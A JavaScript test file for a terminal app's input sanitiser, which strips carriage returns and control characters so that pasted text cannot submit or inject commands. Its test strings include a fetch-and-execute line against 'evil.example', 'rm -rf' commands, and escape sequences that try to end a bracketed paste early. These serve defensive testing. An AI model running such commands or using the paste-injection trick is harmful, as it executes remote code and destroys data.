import fs from 'node:fs'
import { describe, expect, it } from 'vitest'
import { typeable, pasted } from '../src/core/typed-text.js'

// The invariant these protect is stated beside `insert`, beside `paste` and in
// Docs/decisions/0029-a-pane-paste-keeps-its-lines.md, and it is the one with
// teeth: Claude Code has tools that delete files, so nothing Jarvis types may
// submit itself. A carriage return written to a pseudo-terminal is Enter. The
// one carriage return allowed outside a Command shortcut is inside a bracketed
// paste, where the program in front has said it will read it as text.

describe('what may be typed without pressing anything', () => {
  it('leaves ordinary text exactly as it is', () => {
    expect(typeable('npm run assemble')).toBe('npm run assemble')
    expect(typeable('git commit -m "the panel takes a side"')).toBe(
      'git commit -m "the panel takes a side"',
    )
  })

  it('takes the Enter out of a pasted command', () => {
    // The clipboard holds whatever the last page the user read put there, and a
    // page can put something else there as they copy. Without this, one click
    // on Paste ran the second line.
    expect(typeable('Get-ChildItem\rcurl https://evil.example/x.ps1 | iex\r')).toBe(
      'Get-ChildItem curl https://evil.example/x.ps1 | iex',
    )
  })

  it('drops the line break a copy ends on rather than leaving a space', () => {
    // A password copied with its line ending, pasted at sudo: a trailing space
    // nobody can see would make the prompt refuse it.
    expect(typeable('hunter2\n')).toBe('hunter2')
    expect(typeable('hunter2\r\n\r\n')).toBe('hunter2')
  })

  it('reads every kind of line break as one, so no two words are glued', () => {
    // A PowerPoint soft return, a form feed, and the Unicode separators.
    expect(typeable('line one\u000bline two')).toBe('line one line two')
    expect(typeable('a\u000cb\u0085c\u2028d\u2029e')).toBe('a b c d e')
  })

  it('treats a Windows line ending as one break, not two', () => {
    // Every multi-line copy on Windows is CRLF-separated, so this is the common
    // case rather than the attack: it must read as one space.
    expect(typeable('first\r\nsecond')).toBe('first second')
    expect(typeable('first\nsecond')).toBe('first second')
  })

  it('drops the control characters that are keys rather than letters', () => {
    // Tab at a prompt is completion, so it is a space; escape begins a
    // sequence the shell acts on, so it goes.
    expect(typeable('col1\tcol2')).toBe('col1 col2')
    expect(typeable('ls\u001b[Aecho')).toBe('ls[Aecho')
    expect(typeable('a\u0000b\u0007c')).toBe('abc')
  })

  it('drops the 8-bit controls too, the escape that is one character', () => {
    // U+009B opens a sequence on its own, and on Windows ConPTY can turn one
    // into Enter.
    expect(typeable('x\u009b13;28;13;1;0;1_')).toBe('x13;28;13;1;0;1_')
    expect(typeable('a\u0080b\u009fc')).toBe('abc')
  })

  it('answers with an empty string for nothing at all', () => {
    expect(typeable('')).toBe('')
    expect(typeable(null)).toBe('')
    expect(typeable(undefined)).toBe('')
  })
})

describe('what a paste in the terminal pane sends', () => {
  const OPEN = '\u001b[200~'
  const CLOSE = '\u001b[201~'

  it('is flattened like anything typed where the program did not ask for more', () => {
    // A plain shell prompt: there a line break is Enter, and nothing marks the
    // text as pasted.
    expect(pasted('rm -rf x\n', false)).toBe(typeable('rm -rf x\n'))
    expect(pasted('a\tb\nc', false)).toBe('a b c')
  })

  it('keeps lines and tabs where the program asked for bracketed paste', () => {
    // Claude Code asks. A code block or a few spreadsheet rows arrive whole.
    expect(pasted('a\tb\nc', true)).toBe(`${OPEN}a\tb\rc${CLOSE}`)
    expect(pasted('first\r\nsecond\rthird', true)).toBe(`${OPEN}first\rsecond\rthird${CLOSE}`)
  })

  it('cannot close the paste early from inside it', () => {
    // The case that makes keeping the lines safe at all: a clipboard carrying
    // the closing marker would otherwise end the paste and have the rest typed
    // as keys, the carriage return among them.
    const sent = pasted(`ls${CLOSE}rm -rf x\r`, true)
    expect(sent.startsWith(OPEN)).toBe(true)
    expect(sent.endsWith(CLOSE)).toBe(true)
    expect(sent.slice(OPEN.length, -CLOSE.length)).not.toContain('\u001b')
    expect(sent).toBe(`${OPEN}ls[201~rm -rf x\r${CLOSE}`)
    expect(pasted('ls\u009b201~rm', true)).toBe(`${OPEN}ls201~rm${CLOSE}`)
  })

  it('drops the other control characters inside the paste', () => {
    expect(pasted('a\u0000b\u0007c\u007fd\u0003', true)).toBe(`${OPEN}abcd${CLOSE}`)
  })

  it('keeps every kind of line break as a line inside the paste', () => {
    expect(pasted('line one\u000bline two', true)).toBe(`${OPEN}line one\rline two${CLOSE}`)
    expect(pasted('a\u000cb\u0085c\u2028d\u2029e', true)).toBe(`${OPEN}a\rb\rc\rd\re${CLOSE}`)
  })

  it('still sends an empty paste where the program asked for them', () => {
    // Claude Code reads the bare pair of markers as "take the image on the
    // clipboard", which is what Cmd+V of a screenshot means.
    expect(pasted('', true)).toBe(OPEN + CLOSE)
    expect(pasted(null, true)).toBe(OPEN + CLOSE)
  })

  it('sends nothing at all for text that was nothing but controls, or no text unasked', () => {
    expect(pasted('\u001b', true)).toBe('')
    expect(pasted('', false)).toBe('')
  })

  it('never lets a carriage return out except inside a whole paste', () => {
    // The Enter-safety invariant itself, checked against what a hostile
    // clipboard could hold rather than against the shape of the source.
    const pieces = ['a', '\r', '\n', '\r\n', '\t', '\u001b', '\u009b', CLOSE, OPEN, '\u000b', '\u2028', '201~', ' ']
    const inputs = []
    for (const x of pieces) for (const y of pieces) for (const z of pieces) inputs.push(x + y + z)
    for (const text of inputs) {
      for (const bracketed of [false, true]) {
        const sent = pasted(text, bracketed)
        if (!sent.includes('\r') && !sent.includes('\u001b')) continue
        expect(sent.startsWith(OPEN)).toBe(true)
        expect(sent.endsWith(CLOSE)).toBe(true)
        expect(sent.slice(OPEN.length, -CLOSE.length)).not.toMatch(/[\u001b\u0080-\u009f]/)
      }
      expect(typeable(text)).not.toMatch(/[\r\n\u001b\u0080-\u009f]/)
    }
  })
})

describe('the terminal channel', () => {
  // Read rather than run: `main/terminal.js` reaches for node-pty at import, and
  // a real shell is not something a unit test should need. What is checked is
  // the one line the invariant rests on.
  const source = fs.readFileSync(new URL('../src/main/terminal.js', import.meta.url), 'utf8')
  const between = (from, to) => source.slice(source.indexOf(from), source.indexOf(to))

  it('makes typed text typeable before it reaches the shell', () => {
    expect(between('function insert', 'function run')).toContain(
      'shellProcess.write(typeable(text))',
    )
  })

  it('sends a pane paste through the same rule', () => {
    expect(between('function paste', 'function run')).toContain(
      'shellProcess.write(pasted(text, bracketed === true))',
    )
  })

  it('keeps the one path that presses Enter, and keeps it to itself', () => {
    // `run` is a Command shortcut the user pressed, and it is the only writer
    // allowed to append a return.
    expect(between('function run', 'function typeFromUser')).toContain('`${command}\\r`')
    expect(between('function insert', 'function run')).not.toContain('\\r')
  })
})
